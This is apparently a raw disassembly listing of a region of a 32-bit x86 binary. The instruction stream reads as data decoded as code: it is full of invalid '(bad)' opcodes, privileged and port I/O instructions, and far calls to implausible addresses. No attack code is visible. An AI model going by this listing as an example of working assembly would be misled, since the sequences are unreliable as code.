  41e3ac:	pop    eax
  41e3ad:	jo     0x41e402
  41e3af:	xchg   esi,eax
  41e3b0:	rol    BYTE PTR [edi*2+0x784d3d7],1
  41e3b7:	cld    
  41e3b8:	iret   
  41e3b9:	jmp    0x41e378
  41e3bb:	sti    
  41e3bc:	pop    es
  41e3bd:	scas   eax,DWORD PTR es:[edi]
  41e3be:	div    DWORD PTR [edi+0x2cec57]
  41e3c4:	push   edx
  41e3c5:	sub    BYTE PTR [esp+0x63],0x15
  41e3ca:	out    0x1c,al
  41e3cc:	lea    ecx,[ecx+0x3cca82b7]
  41e3d2:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  41e3d4:	mov    edi,DWORD PTR [esi+0x8]
  41e3d7:	idiv   DWORD PTR [ecx]
  41e3d9:	call   0x626322a4
  41e3de:	ins    DWORD PTR es:[edi],dx
  41e3df:	in     al,0x18
  41e3e1:	or     al,0x5f
  41e3e3:	(bad)  
  41e3e4:	ja     0x41e41b
  41e3e6:	sbb    DWORD PTR [esi+0x29],edx
  41e3e9:	sbb    BYTE PTR gs:[edi+0x5dc3],bl
	...
  41e454:	add    BYTE PTR [eax],al
  41e456:	mov    DWORD PTR [edx],edx
  41e458:	ja     0x41e479
  41e45a:	(bad)  
  41e45b:	jg     0x41e446
  41e45d:	xchg   esi,eax
  41e45e:	or     DWORD PTR [edx+0x18],0xe352b509
  41e465:	call   0x100:0x14567
  41e46c:	add    BYTE PTR [eax],al
  41e46e:	mov    eax,0xf7664f06
  41e473:	imul   esp,DWORD PTR [edi],0xb1cf493b
  41e479:	mov    WORD PTR ds:0x626a11df,gs
  41e47f:	in     al,dx
  41e480:	sbb    cl,0x27
  41e483:	out    0xd1,eax
  41e485:	in     al,dx
  41e486:	in     eax,dx
  41e487:	ret    0x74b
  41e48a:	mov    edi,DWORD PTR [ecx]
  41e48c:	enter  0x67a9,0xd
  41e490:	test   BYTE PTR [ebx-0x29],dh
  41e493:	data16 cmp al,0x80
  41e496:	addr16 jle 0x41e501
  41e499:	in     al,0x98
  41e49b:	inc    edi
  41e49c:	adc    ecx,DWORD PTR [esi+esi*4-0x2b95d53e]
  41e4a3:	push   ebp
  41e4a4:	(bad)  [ecx]
  41e4a6:	xchg   ebp,eax
  41e4a7:	push   es
  41e4a8:	xor    ah,BYTE PTR [esi]
  41e4aa:	jmp    0x67e89db6
  41e4af:	ja     0x41e4b5
  41e4b1:	inc    ebp
  41e4b2:	arpl   si,dx
  41e4b4:	xor    eax,0x548dfb5
  41e4b9:	iret   
  41e4ba:	fbstp  TBYTE PTR [ebx]
  41e4bc:	adc    DWORD PTR ds:0x5c9c62ee,esi
  41e4c2:	dec    eax
  41e4c3:	into   
  41e4c4:	jne    0x41e459
  41e4c6:	push   ss
  41e4c7:	popf   
  41e4c8:	dec    edx
  41e4c9:	cs inc ecx
  41e4cb:	pop    ebx
  41e4cc:	push   0x770749e7
  41e4d1:	fistp  QWORD PTR [edi-0x17]
  41e4d4:	xor    eax,0x4e148d4b
  41e4d9:	pusha  
  41e4da:	inc    eax
  41e4db:	dec    esp
  41e4dc:	mov    ebp,0x5131adc6
  41e4e1:	daa    
  41e4e2:	loop   0x41e4b9
  41e4e4:	push   ebx
  41e4e5:	sbb    DWORD PTR [esi-0x6],edi
  41e4e8:	call   0xd0b0:0xd5c81e84
  41e4ef:	mov    ch,0x80
  41e4f1:	iret   
  41e4f2:	mov    ecx,DWORD PTR [ecx+0x1a]
  41e4f5:	sbb    eax,ebp
  41e4f7:	or     ebp,DWORD PTR [ecx-0x39]
  41e4fa:	sub    eax,0x3a3e198a
  41e4ff:	push   ebp
  41e500:	pop    ebp
  41e501:	call   0xa04a:0x8dbd18da
  41e508:	sbb    eax,0x877cdfca
  41e50d:	sbb    DWORD PTR [esi+0x10],ebx
  41e510:	push   ebp
  41e511:	jge    0x41e515
  41e513:	inc    edx
  41e514:	dec    ebx
  41e515:	sti    
  41e516:	cmp    DWORD PTR [ebx],ebp
  41e518:	test   edi,esi
  41e51a:	xor    al,0xff
  41e51c:	push   eax
  41e51d:	test   DWORD PTR [eax],eax
  41e51f:	leave  
  41e520:	jle    0x41e4e4
  41e522:	adc    ebp,edx
  41e524:	shl    DWORD PTR [eax],cl
  41e526:	jnp    0x41e509
  41e528:	cmp    ecx,esp
  41e52a:	repz and dl,BYTE PTR [ebx+0x1b]
  41e52e:	cmp    eax,0x92764335
  41e533:	sub    dl,ah
  41e535:	call   0x7b48:0xbe90fe87
  41e53c:	jl     0x41e57c
  41e53e:	adc    ecx,0xb4616b00
  41e544:	pop    eax
  41e545:	jo     0x41e4d6
  41e547:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e548:	jle    0x41e572
  41e54a:	xchg   ecx,eax
  41e54b:	push   ebx
  41e54c:	pop    ebx
  41e54d:	xor    BYTE PTR [edi+0x20],0x64
  41e551:	pop    ds
  41e552:	sub    ch,ah
  41e554:	mov    esp,0x23da0058
  41e559:	and    BYTE PTR [edi-0xb41b450],cl
  41e55f:	inc    ebp
  41e560:	add    edi,DWORD PTR [edx]
  41e562:	pop    esi
  41e563:	rol    DWORD PTR [eax],cl
  41e565:	jl     0x41e4f6
  41e567:	test   al,cl
  41e569:	sbb    eax,0xa6fabb18
	...
  41e5d6:	and    BYTE PTR [edx-0x35],ch
  41e5d9:	dec    ebx
  41e5da:	retf   
  41e5db:	jmp    0x41e57d
  41e5dd:	imul   ebp,ebx,0xffffffb1
  41e5e0:	aaa    
  41e5e1:	je     0x41e58f
  41e5e3:	pop    edi
  41e5e4:	punpckldq mm4,DWORD PTR [edi+0x46]
  41e5e8:	add    DWORD PTR [eax],eax
  41e5ea:	add    BYTE PTR [ecx],al
  41e5ec:	add    BYTE PTR [eax],al
  41e5ee:	xchg   esp,eax
  41e5ef:	cdq    
  41e5f0:	xchg   edx,eax
  41e5f1:	dec    edx
  41e5f2:	jp     0x41e586
  41e5f4:	xor    dh,BYTE PTR [esi+0x41]
  41e5f7:	lahf   
  41e5f8:	scas   eax,DWORD PTR es:[edi]
  41e5f9:	or     edi,esp
  41e5fb:	adc    BYTE PTR [esi+0x39],al
  41e5fe:	(bad)  
  41e5ff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e600:	adc    eax,0x981a9173
  41e605:	sub    DWORD PTR [ecx],esp
  41e607:	xor    ebp,esp
  41e609:	mov    ch,0x4c
  41e60b:	popa   
  41e60c:	mov    esp,0xbbcb9f82
  41e611:	(bad)  
  41e612:	mov    dh,0xc2
  41e614:	adc    ah,cl
  41e616:	ror    DWORD PTR [esi],1
  41e618:	ins    BYTE PTR es:[edi],dx
  41e619:	inc    edi
  41e61a:	pop    ds
  41e61b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e61c:	adc    bh,ah
  41e61e:	rcl    bh,1
  41e620:	mov    ch,0x51
  41e622:	sub    ah,BYTE PTR [esp+ebp*2-0x6e419bc8]
  41e629:	dec    edx
  41e62a:	xchg   ebx,eax
  41e62b:	sub    eax,DWORD PTR [edx]
  41e62d:	push   esp
  41e62e:	push   ecx
  41e62f:	and    esi,DWORD PTR [ebp+0xb]
  41e632:	rol    ebx,1
  41e634:	mov    bh,0x4c
  41e636:	clc    
  41e637:	mov    al,ds:0x94c0be0f
  41e63c:	push   ss
  41e63d:	cmp    edi,ebx
  41e63f:	xlat   BYTE PTR ds:[ebx]
  41e640:	ja     0x41e639
  41e642:	les    ebx,FWORD PTR [esi]
  41e644:	jnp    0x41e668
  41e646:	or     edi,DWORD PTR [eax-0x5e]
  41e649:	les    edx,FWORD PTR ds:[esi]
  41e64c:	xchg   ebp,eax
  41e64d:	inc    ecx
  41e64e:	mov    ecx,DWORD PTR [eax+0x21]
  41e651:	(bad)  [ecx]
  41e653:	cmc    
  41e654:	clc    
  41e655:	mov    DWORD PTR [edx+0x11],ebp
  41e658:	int3   
  41e659:	xchg   ecx,eax
  41e65a:	inc    eax
  41e65b:	lods   eax,DWORD PTR es:[esi]
  41e65d:	arpl   WORD PTR [edx],ax
  41e65f:	inc    ebp
  41e660:	and    eax,0xb5d8843f
  41e665:	mov    bh,0x17
  41e667:	jo     0x41e666
  41e669:	push   ecx
  41e66a:	or     eax,0x94fab9b5
  41e66f:	je     0x41e5f2
  41e671:	or     bl,BYTE PTR [ebx+0xe]
  41e674:	pop    ss
  41e675:	pop    ds
  41e676:	inc    eax
  41e677:	cwde   
  41e678:	pushf  
  41e679:	ds call 0x7011bdc3
  41e67f:	popa   
  41e680:	sub    BYTE PTR [edi*8-0x2274f346],al
  41e687:	pop    ss
  41e688:	adc    BYTE PTR [ebx-0x52583925],bh
  41e68e:	xor    al,0x11
  41e690:	(bad)  {k7}
  41e695:	arpl   WORD PTR [esi],ax
  41e697:	loop   0x41e636
  41e699:	mov    ah,0x6f
  41e69b:	sub    eax,0x172bda6d
  41e6a0:	aad    0xb4
  41e6a2:	in     eax,dx
  41e6a3:	sbb    bh,0xa6
  41e6a6:	out    0xe2,al
  41e6a8:	mov    bh,0xdc
  41e6aa:	xchg   edx,eax
  41e6ab:	xchg   esi,eax
  41e6ac:	fdivr  QWORD PTR [eax+ebx*2]
  41e6af:	mov    ebx,0x368058c4
  41e6b4:	or     BYTE PTR cs:[ecx+ecx*4-0x5b],al
  41e6b9:	mov    ds:0xde03b465,eax
  41e6be:	or     al,0xeb
  41e6c0:	retf   0x55ca
  41e6c3:	cmp    eax,0x6b85b312
  41e6c8:	or     cl,al
  41e6ca:	dec    edi
  41e6cb:	mov    ch,0x98
  41e6cd:	adc    BYTE PTR [edi],bh
  41e6cf:	scas   eax,DWORD PTR es:[edi]
  41e6d0:	dec    ebp
  41e6d1:	inc    edi
  41e6d2:	test   al,0xb4
  41e6d4:	mov    eax,esp
  41e6d6:	inc    ecx
  41e6d7:	in     eax,dx
  41e6d8:	pop    es
  41e6d9:	rol    BYTE PTR [esi+0x444970a7],cl
  41e6df:	shl    DWORD PTR [ebp+0x5887409d],0xb9
  41e6e6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e6e7:	sbb    ah,BYTE PTR [ecx-0x57]
  41e6ea:	hlt    
  41e6eb:	adc    eax,0x6ee9
	...
  41e754:	add    BYTE PTR [eax],al
  41e756:	lds    ebx,FWORD PTR [eax+0x7dfd55e1]
  41e75c:	cmc    
  41e75d:	cwde   
  41e75e:	xchg   esp,eax
  41e75f:	push   0x37
  41e761:	sub    ebp,edx
  41e763:	ss mov cl,cl
  41e766:	addr16 inc edi
  41e768:	add    DWORD PTR [eax],eax
  41e76a:	add    BYTE PTR [ecx],al
  41e76c:	add    BYTE PTR [eax],al
  41e76e:	shl    cl,cl
  41e770:	inc    edx
  41e771:	call   0x9167375d
  41e776:	add    dl,BYTE PTR [edi+0x56]
  41e779:	fld    QWORD PTR [eax+0x6f59df4]
  41e77f:	addr16 hlt 
  41e781:	pop    ds
  41e782:	mov    es,WORD PTR [esi-0x102116be]
  41e788:	xchg   edi,eax
  41e789:	sbb    eax,DWORD PTR [esi]
  41e78b:	jge    0x41e7fd
  41e78d:	xlat   BYTE PTR ds:[ebx]
  41e78e:	in     eax,dx
  41e78f:	push   eax
  41e790:	push   0xffffffa7
  41e792:	push   edx
  41e793:	fsincos 
  41e795:	(bad)  
  41e796:	jp     0x41e811
  41e798:	mov    al,ds:0xb7c4faec
  41e79d:	fild   DWORD PTR [ecx-0x7e7152d0]
  41e7a3:	inc    ecx
  41e7a4:	popa   
  41e7a5:	cld    
  41e7a6:	popa   
  41e7a7:	icebp  
  41e7a8:	out    0xee,al
  41e7aa:	stc    
  41e7ab:	es jecxz 0x41e7a2
  41e7ae:	std    
  41e7af:	mov    eax,ds:0x4d50ff6e
  41e7b4:	xor    al,0x5b
  41e7b6:	leave  
  41e7b7:	retf   0xea43
  41e7ba:	std    
  41e7bb:	aas    
  41e7bc:	mov    al,ds:0xa3f12a8f
  41e7c1:	ficomp WORD PTR [edi+0xb6e4555]
  41e7c7:	mov    ds:0x5c15b399,eax
  41e7cc:	repz in al,0xfe
  41e7cf:	(bad)  
  41e7d0:	xor    al,0x19
  41e7d2:	pop    ebx
  41e7d3:	in     al,dx
  41e7d4:	arpl   WORD PTR [esi-0x6896dfd4],cx
  41e7da:	sub    DWORD PTR [esi],edx
  41e7dc:	cmp    dh,BYTE PTR [edi+0x10]
  41e7df:	lock push ecx
  41e7e1:	sub    al,0x47
  41e7e3:	(bad)  
  41e7e4:	jne    0x41e7d0
  41e7e6:	mov    dh,0xd9
  41e7e8:	(bad)  
  41e7ea:	or     DWORD PTR [eax],esi
  41e7ec:	push   0x8b136ada
  41e7f1:	pop    ebp
  41e7f2:	pop    ebp
  41e7f3:	xor    edi,0x4e68414b
  41e7f9:	jecxz  0x41e780
  41e7fb:	cmp    ah,ch
  41e7fd:	mov    ds:0x2d893b17,al
  41e802:	int    0xbf
  41e804:	push   cs
  41e805:	(bad)  
  41e807:	and    bh,BYTE PTR [eax]
  41e809:	mov    bl,0x7d
  41e80b:	ss inc ebx
  41e80d:	les    ebx,FWORD PTR [eax-0x4]
  41e810:	xchg   esp,eax
  41e811:	pop    edx
  41e812:	mov    DWORD PTR [eax],edx
  41e814:	sbb    esp,ecx
  41e816:	jb     0x41e80c
  41e818:	mov    edi,0xd7fe4f58
  41e81d:	xchg   esi,eax
  41e81e:	imul   eax,ebp,0x1dfd4cc7
  41e824:	add    cl,BYTE PTR [edi-0xd]
  41e827:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e828:	ror    DWORD PTR [esi+0x66],1
  41e82b:	mov    esi,ecx
  41e82d:	or     edx,ebx
  41e82f:	sub    al,cl
  41e831:	hlt    
  41e832:	leave  
  41e833:	jb     0x41e805
  41e835:	fild   QWORD PTR [ecx]
  41e837:	jnp    0x41e7e9
  41e839:	in     al,0x88
  41e83b:	pop    ecx
  41e83c:	and    DWORD PTR [edx+0x41],esp
  41e83f:	scas   al,BYTE PTR es:[edi]
  41e840:	jne    0x41e8a7
  41e842:	jg     0x41e7c8
  41e844:	rol    BYTE PTR [ebx],1
  41e846:	xchg   ah,dl
  41e848:	sub    BYTE PTR [esi-0x54564865],bh
  41e84e:	mov    bh,0xee
  41e850:	inc    BYTE PTR cs:[ebx-0x11]
  41e854:	sub    al,0x74
  41e856:	adc    DWORD PTR [ecx+edx*8+0x3c3883aa],esi
  41e85d:	mov    BYTE PTR [ebp+0x25f05ffc],0x3
  41e864:	push   edx
  41e865:	int    0xba
  41e867:	imul   ebp,esi,0xffffffd8
  41e86a:	bound  eax,QWORD PTR [esp+eiz*8+0x1c]
	...
  41e8d6:	sub    eax,0x9e5c8a39
  41e8db:	(bad)  
  41e8dc:	(bad)  
  41e8dd:	jns    0x41e94e
  41e8df:	xor    al,0xcc
  41e8e1:	jg     0x41e95c
  41e8e3:	mov    ecx,0x48673b34
  41e8e8:	add    DWORD PTR [eax],eax
  41e8ea:	add    BYTE PTR [ecx],al
  41e8ec:	add    BYTE PTR [eax],al
  41e8ee:	sar    DWORD PTR [esi+0x3c2349d2],0x4
  41e8f5:	jae    0x41e916
  41e8f7:	movhps QWORD PTR [eiz*2+0xbf09a48],xmm6
  41e8ff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e900:	ins    DWORD PTR es:[edi],dx
  41e901:	mov    BYTE PTR [edi-0x305bf012],cl
  41e907:	repz repz call 0x1ef0:0xfe8d5d47
  41e910:	xlat   BYTE PTR ds:[ebx]
  41e911:	ds xor al,0x5b
  41e914:	iret   
  41e915:	or     eax,0x1d29c304
  41e91a:	jp     0x41e906
  41e91c:	dec    ecx
  41e91d:	cli    
  41e91e:	xchg   ebp,eax
  41e91f:	aas    
  41e920:	fwait
  41e921:	xchg   ebp,eax
  41e922:	out    0x7b,eax
  41e924:	mov    eax,ds:0xa2f889e6
  41e929:	sbb    al,0xf9
  41e92b:	xchg   edi,eax
  41e92c:	test   ebp,edx
  41e92e:	gs popa 
  41e930:	mov    esi,0xf399f28c
  41e935:	xchg   ebx,eax
  41e936:	js     0x41e8eb
  41e938:	and    eax,0x635ab90
  41e93d:	jne    0x41e9b2
  41e93f:	or     dl,bl
  41e941:	dec    edi
  41e942:	scas   al,BYTE PTR es:[edi]
  41e943:	nop
  41e944:	aas    
  41e945:	rol    ebx,1
  41e947:	(bad)  
  41e948:	fistp  DWORD PTR [ebp+0x42]
  41e94b:	add    ebp,DWORD PTR [ebx+0x50]
  41e94e:	mov    edi,0x3cd36ba4
  41e953:	pop    ss
  41e954:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e955:	out    dx,eax
  41e956:	inc    esi
  41e957:	dec    ebp
  41e958:	or     DWORD PTR [esi+0x50ef1a84],esi
  41e95e:	mov    eax,DWORD PTR [edi+0x3acf9ab5]
  41e964:	sub    esp,edi
  41e966:	mov    bl,0xd5
  41e968:	imul   eax,DWORD PTR [edx+0x7a0726b5],0x27
  41e96f:	imul   edx,edx,0x4a1c4365
  41e975:	and    DWORD PTR [esi+0x750f151f],eax
  41e97b:	xchg   esi,eax
  41e97c:	xor    edi,eax
  41e97e:	jnp    0x41e982
  41e980:	pop    edi
  41e981:	xchg   esi,eax
  41e982:	cmp    ebx,0x681d059b
  41e988:	mov    bh,0x1c
  41e98a:	push   DWORD PTR [edx]
  41e98c:	jns    0x41e9dc
  41e98e:	leave  
  41e98f:	outs   dx,DWORD PTR ds:[esi]
  41e990:	enter  0xa692,0x58
  41e994:	data16 aam 0x9b
  41e997:	push   0xe15d7283
  41e99c:	daa    
  41e99d:	call   0xfdbb:0x87d7f76c
  41e9a4:	xlat   BYTE PTR ds:[ebx]
  41e9a5:	jne    0x41e99a
  41e9a7:	push   eax
  41e9a8:	push   es
  41e9a9:	lock and dh,BYTE PTR [ebx]
  41e9ac:	xor    al,0xea
  41e9ae:	lods   eax,DWORD PTR ds:[esi]
  41e9af:	dec    ebx
  41e9b0:	loop   0x41ea10
  41e9b2:	cmp    ebx,DWORD PTR [edx-0x37f3108d]
  41e9b8:	cmp    DWORD PTR [eax+0xbf0a1],ebx
  41e9be:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e9bf:	add    DWORD PTR [esi],ebp
  41e9c1:	xchg   esp,eax
  41e9c2:	and    BYTE PTR [ebx],bl
  41e9c4:	dec    ecx
  41e9c5:	stos   BYTE PTR es:[edi],al
  41e9c6:	sbb    eax,0x8ca5fd8b
  41e9cb:	iret   
  41e9cc:	mov    DWORD PTR [esi-0xb9f1c86],ebx
  41e9d2:	in     al,dx
  41e9d3:	cmp    eax,0x98851c3c
  41e9d8:	xchg   ecx,eax
  41e9d9:	dec    esi
  41e9da:	aad    0x5f
  41e9dc:	clc    
  41e9dd:	xchg   edx,eax
  41e9de:	mov    ch,0x16
  41e9e0:	xchg   edx,eax
  41e9e1:	xor    bl,ah
  41e9e3:	mov    ecx,DWORD PTR [ebp+eiz*1+0x75]
  41e9e7:	xchg   esp,eax
  41e9e8:	dec    edi
  41e9e9:	test   DWORD PTR [edx-0x27],ebx
  41e9ec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e9ed:	or     eax,DWORD PTR [eax]
	...
  41ea53:	add    BYTE PTR [eax],al
  41ea55:	add    BYTE PTR [eax-0x3],bh
  41ea58:	ret    0xc766
  41ea5b:	jg     0x41ea59
  41ea5d:	dec    DWORD PTR [edi+0x67]
  41ea60:	rol    dl,1
  41ea62:	(bad)  
  41ea63:	in     al,dx
  41ea64:	or     eax,0x1496715
  41ea69:	add    BYTE PTR [eax],al
  41ea6b:	add    DWORD PTR [eax],eax
  41ea6d:	add    BYTE PTR [esi+0x6c],al
  41ea70:	xchg   ebx,eax
  41ea71:	mov    ds:0xae4a6997,eax
  41ea76:	fcomp  QWORD PTR ds:0x97485f41
  41ea7c:	xor    BYTE PTR [edx],bh
  41ea7e:	fcomp  DWORD PTR [edx]
  41ea80:	and    ah,BYTE PTR ds:0x7357dbb1
  41ea86:	gs pop ds
  41ea88:	xor    ch,BYTE PTR [edx-0x6]
  41ea8b:	cmp    DWORD PTR [ebx-0x2c],0xffffffe3
  41ea8f:	es jmp 0x41eb0e
  41ea92:	lock outs dx,DWORD PTR ds:[esi]
  41ea94:	fdivrp st(2),st
  41ea96:	pop    ss
  41ea97:	loop   0x41eadf
  41ea99:	rcr    BYTE PTR [edi+ebx*8+0x59],1
  41ea9d:	xchg   DWORD PTR [esi-0x2759c01],ecx
  41eaa3:	dec    edi
  41eaa4:	fistp  QWORD PTR [ebx]
  41eaa6:	xchg   ebp,eax
  41eaa7:	jo     0x41ea86
  41eaa9:	fwait
  41eaaa:	pop    ds
  41eaab:	xor    eax,edx
  41eaad:	ror    BYTE PTR [ecx+0x47],1
  41eab0:	xor    ah,ah
  41eab2:	jge    0x41ea62
  41eab4:	push   edx
  41eab5:	shl    DWORD PTR [ebx+ecx*8+0x452e546d],1
  41eabc:	adc    ah,BYTE PTR [esi-0x13944d98]
  41eac2:	mov    BYTE PTR [edx*4-0x3a173849],bl
  41eac9:	je     0x41eb22
  41eacb:	add    bh,cl
  41eacd:	das    
  41eace:	jle    0x41eb38
  41ead0:	and    eax,edi
  41ead2:	(bad)  
  41ead3:	mov    edi,0x70ff28a5
  41ead8:	push   ebp
  41ead9:	add    ebp,esi
  41eadb:	das    
  41eadc:	adc    edi,0x4d
  41eadf:	mov    ah,0x91
  41eae1:	lds    eax,FWORD PTR [ebp+0x5e]
  41eae4:	ds pop edi
  41eae6:	enter  0xbaf4,0x2b
  41eaea:	or     BYTE PTR [edx-0x5232d565],dh
  41eaf0:	adc    edx,ebp
  41eaf2:	dec    ecx
  41eaf3:	push   ds
  41eaf4:	cmp    BYTE PTR [eax-0x4f],dh
  41eaf7:	xchg   ebx,eax
  41eaf8:	and    ebp,eax
  41eafa:	push   ds
  41eafb:	mov    eax,0xb1d2036c
  41eb00:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41eb01:	adc    DWORD PTR [eax+0x622fe774],edx
  41eb07:	ja     0x41eae6
  41eb09:	jecxz  0x41eb0b
  41eb0b:	mov    eax,0xf4133ea0
  41eb10:	push   ecx
  41eb11:	mov    ds:0x1432084a,al
  41eb16:	push   es
  41eb17:	imul   ecx,eax,0x5809d0f
  41eb1d:	test   al,0xdb
  41eb1f:	fld    DWORD PTR [esi-0x66]
  41eb22:	mov    eax,ds:0x7e9a57b4
  41eb27:	popa   
  41eb28:	scas   al,BYTE PTR es:[edi]
  41eb29:	mov    ecx,0xf2b29d64
  41eb2e:	xchg   esp,eax
  41eb2f:	in     eax,0x4
  41eb31:	fdivr  DWORD PTR [esp+ecx*1-0x3ad57401]
  41eb38:	cdq    
  41eb39:	cwde   
  41eb3a:	mov    DWORD PTR [ebp-0x53760f05],ecx
  41eb40:	nop
  41eb41:	and    ecx,edx
  41eb43:	mov    ecx,0x7cc75b87
  41eb48:	mov    bh,0xca
  41eb4a:	outs   dx,BYTE PTR ds:[esi]
  41eb4b:	out    dx,eax
  41eb4c:	sub    cl,BYTE PTR [edx]
  41eb4e:	mov    DWORD PTR [edx+0x47],edi
  41eb51:	pop    edx
  41eb52:	mov    ?,WORD PTR [edi-0x21]
  41eb55:	xchg   edi,eax
  41eb56:	sub    bh,bh
  41eb58:	add    BYTE PTR [edi+edx*4-0x5fe0d8e6],dl
  41eb5f:	je     0x41eb22
  41eb61:	gs dec ebx
  41eb63:	and    dl,dl
  41eb65:	mov    ds:0x255e3e87,al
  41eb6a:	test   al,0x83
  41eb6c:	lds    edi,FWORD PTR [ecx]
	...
  41ebd6:	adc    ch,BYTE PTR [edi]
  41ebd8:	mov    esi,DWORD PTR [edi+edi*4+0xaaf3fb4]
  41ebdf:	out    0x9b,al
  41ebe1:	aad    0xdd
  41ebe3:	sbb    edx,ebx
  41ebe5:	aas    
  41ebe6:	addr16 dec edx
  41ebe8:	add    DWORD PTR [eax],eax
  41ebea:	add    BYTE PTR [ecx],al
  41ebec:	add    BYTE PTR [eax],al
  41ebee:	mov    edx,DWORD PTR [edx+0x2b]
  41ebf1:	int3   
  41ebf2:	cmp    bh,dl
  41ebf4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ebf5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ebf6:	jmp    0xdb2fe12b
  41ebfb:	(bad)  
  41ebfd:	pop    edi
  41ebfe:	sub    al,0xdb
  41ec00:	pop    edx
  41ec01:	je     0x41ec19
  41ec03:	rcl    DWORD PTR [esi-0x14],cl
  41ec06:	lods   al,BYTE PTR ds:[esi]
  41ec07:	cmc    
  41ec08:	inc    ebx
  41ec09:	les    ecx,FWORD PTR [eax-0x2a226bbf]
  41ec0f:	popf   
  41ec10:	scas   eax,DWORD PTR es:[edi]
  41ec11:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ec12:	sbb    ah,bl
  41ec14:	ror    BYTE PTR [ebp+0x5f94085],0x2b
  41ec1b:	imul   eax,DWORD PTR [ecx+0x80459a1],0x60
  41ec22:	push   0xffffffd8
  41ec24:	loope  0x41ebce
  41ec26:	data16 mov ds:0xe0c6ef25,al
  41ec2c:	pop    ss
  41ec2d:	or     al,0x7f
  41ec2f:	push   edx
  41ec30:	mov    esi,0x5f54fdd7
  41ec35:	and    DWORD PTR [esi-0x4446881b],esp
  41ec3b:	push   esi
  41ec3c:	or     bh,BYTE PTR [ecx+0xf63039b]
  41ec42:	push   0x421e90ac
  41ec47:	xor    al,0x29
  41ec49:	and    BYTE PTR [bp+si],ch
  41ec4c:	repz shl BYTE PTR [eax-0x1c],0xe8
  41ec51:	pop    ebx
  41ec52:	int3   
  41ec53:	fwait
  41ec54:	pop    es
  41ec55:	mov    esp,0xe42c8934
  41ec5a:	push   0x70
  41ec5c:	sbb    eax,0x71d288a9
  41ec61:	adc    eax,0x3b336fde
  41ec66:	cmc    
  41ec67:	imul   esp,DWORD PTR [ebx-0x15],0xffffffb1
  41ec6b:	xchg   ebx,eax
  41ec6c:	scas   al,BYTE PTR es:[edi]
  41ec6d:	fcmove st,st(7)
  41ec6f:	push   edx
  41ec70:	add    al,0x70
  41ec72:	pop    esi
  41ec73:	pop    ss
  41ec74:	out    dx,eax
  41ec75:	in     eax,dx
  41ec76:	mov    ecx,esp
  41ec78:	jg     0x41ec90
  41ec7a:	push   esi
  41ec7b:	push   eax
  41ec7c:	mov    ebp,0x52aed2b2
  41ec81:	neg    BYTE PTR [ecx+0x50]
  41ec84:	mov    esp,0x28f5558c
  41ec89:	mov    bh,0xf7
  41ec8b:	nop
  41ec8c:	int    0x2e
  41ec8e:	add    DWORD PTR [ecx+ebx*4],ebx
  41ec91:	push   edx
  41ec92:	xchg   ebp,eax
  41ec93:	js     0x41ecec
  41ec95:	jle    0x41eca3
  41ec97:	sahf   
  41ec98:	shl    esi,cl
  41ec9a:	cs pop edi
  41ec9c:	ror    ah,0x10
  41ec9f:	sub    eax,0xacc6b2f6
  41eca4:	xor    cl,BYTE PTR [eax-0x49f02e6e]
  41ecaa:	sti    
  41ecab:	pop    eax
  41ecac:	cmp    al,0xb3
  41ecae:	add    ch,BYTE PTR [esi-0x13]
  41ecb1:	or     al,0xc8
  41ecb3:	add    ah,ah
  41ecb5:	sti    
  41ecb6:	adc    al,0xb7
  41ecb8:	cmp    DWORD PTR es:[ebx+0x6c92816e],esi
  41ecbf:	cwde   
  41ecc0:	jb     0x41ec5f
  41ecc2:	popf   
  41ecc3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ecc4:	pop    ecx
  41ecc5:	daa    
  41ecc6:	add    edi,ecx
  41ecc8:	rol    ch,cl
  41ecca:	out    0x7f,eax
  41eccc:	retf   0x7188
  41eccf:	xor    eax,0x69be1236
  41ecd4:	and    BYTE PTR [ecx-0xea10c0b],bl
  41ecda:	or     dl,bh
  41ecdc:	sub    esp,DWORD PTR [ebx+0x5bf6901c]
  41ece2:	(bad)  
  41ece3:	xor    edi,DWORD PTR [ebp-0xf]
  41ece6:	mov    cl,al
  41ece8:	cwde   
  41ece9:	mov    ch,0xc
  41eceb:	push   eax
  41ecec:	and    BYTE PTR [ebp+0x0],cl
	...
  41ed53:	add    BYTE PTR [eax],al
  41ed55:	add    BYTE PTR [ecx-0xf],al
  41ed58:	(bad)
  41ed5b:	hlt    
  41ed5c:	gs icebp 
  41ed5e:	dec    edi
  41ed5f:	adc    eax,0x7eb15fd0
  41ed64:	pop    edi
  41ed65:	pop    esp
  41ed66:	addr16 dec ebx
  41ed68:	add    DWORD PTR [eax],eax
  41ed6a:	add    BYTE PTR [ecx],al
  41ed6c:	add    BYTE PTR [eax],al
  41ed6e:	daa    
  41ed6f:	and    ebx,DWORD PTR [ebx-0x32]
  41ed72:	jle    0x41ed59
  41ed74:	sbb    esp,DWORD PTR [ecx]
  41ed76:	sub    eax,0x3bbd5efb
  41ed7b:	xor    BYTE PTR gs:[eax],0x1e
  41ed7f:	cwde   
  41ed80:	cmp    BYTE PTR [edx+0x4c],cl
  41ed83:	popf   
  41ed84:	jns    0x41edac
  41ed86:	adc    ebp,ecx
  41ed88:	cmp    DWORD PTR [esi+0x42],ebp
  41ed8b:	test   DWORD PTR [edi],edi
  41ed8d:	loopne 0x41edb8
  41ed8f:	pop    eax
  41ed90:	adc    ch,BYTE PTR [eax+ecx*4+0x56]
  41ed94:	(bad)  
  41ed95:	fidivr WORD PTR [edx+ebp*2-0x2d7c291e]
  41ed9c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ed9d:	xchg   BYTE PTR [eax-0x4f387783],dh
  41eda3:	jmp    0x41ee21
  41eda5:	mov    eax,0x2b1eb894
